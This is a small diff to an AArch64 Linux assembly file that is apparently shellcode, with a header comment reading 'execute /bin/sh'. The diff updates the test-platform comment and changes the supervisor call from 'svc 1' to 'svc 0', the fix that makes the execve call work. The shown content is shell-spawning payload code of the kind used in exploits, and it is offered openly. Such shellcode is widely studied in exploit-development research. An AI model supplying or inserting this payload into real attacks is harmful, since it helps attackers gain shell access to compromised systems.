@@ -1,6 +1,6 @@
 /**
   execute /bin/sh
-  tested with linux running on ubuntu
+  tested with ubuntu/AArch64
 
   http://modexp.wordpress.com/   
 */
@@ -14,6 +14,6 @@ _start:
     eor    x1, x1, x1     // x1 = NULL
     eor    x2, x2, x2     // x2 = NULL
     mov    x8, #221       // x8 = execve
-    svc    1
+    svc    0
 sh:    
     .ascii "/bin/sh\0"
